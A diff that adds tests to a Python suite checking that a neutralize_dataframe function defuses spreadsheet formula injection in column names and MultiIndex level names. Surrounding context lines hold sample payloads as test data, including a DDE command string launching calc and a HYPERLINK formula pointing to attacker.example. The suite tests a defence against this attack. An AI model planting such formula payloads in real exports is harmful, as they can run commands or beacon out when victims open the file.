@@ -66,6 +66,24 @@ def test_neutralize_dataframe_prefixes_dangerous_index_labels() -> None:
     assert safe.index.tolist() == ["'=CMD|\"/C calc\"!A0"]
 
 
+def test_neutralize_dataframe_preserves_and_neutralizes_column_axis_name() -> None:
+    df = pd.DataFrame([[1, 2]], columns=pd.Index(["a", "=CMD"], name="@axis"))
+    safe = neutralize_dataframe(df)
+    assert list(safe.columns) == ["a", "'=CMD"]
+    assert safe.columns.name == "'@axis"
+
+
+def test_neutralize_dataframe_preserves_multiindex_column_names() -> None:
+    columns = pd.MultiIndex.from_tuples(
+        [("grp", "=A1"), ("grp", "safe")],
+        names=["@level0", "level1"],
+    )
+    df = pd.DataFrame([[1, 2]], columns=columns)
+    safe = neutralize_dataframe(df)
+    assert safe.columns.names == ["'@level0", "level1"]
+    assert list(safe.columns) == [("grp", "'=A1"), ("grp", "safe")]
+
+
 def test_neutralized_xlsx_export_is_not_formula_cell() -> None:
     payload = '=HYPERLINK("https://attacker.example/beacon","open")'
     safe_df = neutralize_dataframe(pd.DataFrame([{"VendorNote": payload}]))
